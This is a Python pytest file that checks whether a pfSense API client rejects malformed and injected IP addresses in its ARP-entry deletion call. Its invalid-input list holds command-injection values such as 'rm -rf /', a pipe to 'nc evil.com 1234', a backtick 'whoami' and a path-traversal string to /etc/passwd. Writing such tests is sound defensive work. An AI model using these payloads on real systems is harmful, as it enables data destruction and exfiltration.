"""Tests for URL injection protection in pfSense client."""

import pytest
from unittest.mock import AsyncMock, patch
from src.pfsense_client import HTTPPfSenseClient


class TestDeleteArpEntryURLInjection:
    """Test URL injection protection for delete_arp_entry."""
    
    @pytest.fixture
    def mock_client(self):
        """Create a mock pfSense client."""
        config = {
            'host': '192.168.1.1',
            'port': 443,
            'api_key': 'test_key',
            'ssl_verify': 'false'
        }
        client = HTTPPfSenseClient(config)
        return client
    
    @pytest.mark.asyncio
    async def test_delete_arp_entry_valid_ip(self, mock_client):
        """Test that delete_arp_entry accepts valid IP addresses."""
        valid_ips = [
            "192.168.1.100",
            "10.0.0.1",
            "172.16.0.50",
            "8.8.8.8",
            "::1",
            "2001:0db8:85a3::8a2e:0370:7334"
        ]
        
        # Mock the _make_request method
        with patch.object(mock_client, '_make_request', new_callable=AsyncMock) as mock_request:
            mock_request.return_value = {"status": "success"}
            
            for ip in valid_ips:
                result = await mock_client.delete_arp_entry(ip)
                assert result == {"status": "success"}
                
                # Verify the request was made with URL-encoded parameters
                call_args = mock_request.call_args
                assert call_args is not None
                url = call_args[0][1]  # Second positional argument is the URL
                assert "ip=" in url
                assert "?" in url
    
    @pytest.mark.asyncio
    async def test_delete_arp_entry_invalid_ip_raises_error(self, mock_client):
        """Test that delete_arp_entry rejects invalid IP addresses."""
        invalid_ips = [
            "256.256.256.256",
            "192.168.1",
            "192.168.1.1.1",
            "not-an-ip",
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && reboot",
            "192.168.1.1 | nc evil.com 1234",
            "192.168.1.1`whoami`",
            "../../../etc/passwd",
            "192.168.1.1?extra=param",
            "192.168.1.1&another=value",
            "",
            "DROP TABLE users"
        ]
        
        for ip in invalid_ips:
            with pytest.raises(ValueError) as exc_info:
                await mock_client.delete_arp_entry(ip)
            
            assert "Invalid IP address" in str(exc_info.value)
            assert ip in str(exc_info.value)
    
    @pytest.mark.asyncio
    async def test_delete_arp_entry_url_encoding(self, mock_client):
        """Test that IP addresses are properly URL-encoded."""
        # Mock the _make_request method to capture the URL
        with patch.object(mock_client, '_make_request', new_callable=AsyncMock) as mock_request:
            mock_request.return_value = {"status": "success"}
            
            # Test with a valid IP that contains special characters when encoded
            test_ip = "192.168.1.1"
            await mock_client.delete_arp_entry(test_ip)
            
            # Verify URL encoding was applied
            call_args = mock_request.call_args
            url = call_args[0][1]
            
            # The URL should contain properly encoded parameters
            assert url.startswith("/api/v2/diagnostics/arp_table/entry?")
            assert "ip=192.168.1.1" in url
            # Verify urlencode was used (result is same as manual for simple IPs)
            assert url == "/api/v2/diagnostics/arp_table/entry?ip=192.168.1.1"
    
    @pytest.mark.asyncio
    async def test_delete_arp_entry_no_parameter_injection(self, mock_client):
        """Test that parameter injection attempts are blocked by IP validation."""
        injection_attempts = [
            "192.168.1.1&admin=true",
            "192.168.1.1?delete=all",
            "192.168.1.1#fragment",
            "192.168.1.1/../../admin",
        ]
        
        for attempt in injection_attempts:
            with pytest.raises(ValueError) as exc_info:
                await mock_client.delete_arp_entry(attempt)
            
            assert "Invalid IP address" in str(exc_info.value)


class TestURLEncodingConsistency:
    """Test that URL encoding is consistently applied across client methods."""
    
    @pytest.fixture
    def mock_client(self):
        """Create a mock pfSense client."""
        config = {
            'host': '192.168.1.1',
            'port': 443,
            'api_key': 'test_key',
            'ssl_verify': 'false'
        }
        client = HTTPPfSenseClient(config)
        return client
    
    @pytest.mark.asyncio
    async def test_get_system_logs_parameter_handling(self, mock_client):
        """Test that get_system_logs properly handles the limit parameter."""
        with patch.object(mock_client, '_make_request', new_callable=AsyncMock) as mock_request:
            mock_request.return_value = {"logs": []}
            
            # Test with a valid limit
            await mock_client.get_system_logs(limit=50)
            
            call_args = mock_request.call_args
            url = call_args[0][1]
            
            # Verify the URL is properly constructed
            assert "/api/v2/system/logs?limit=50" in url


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
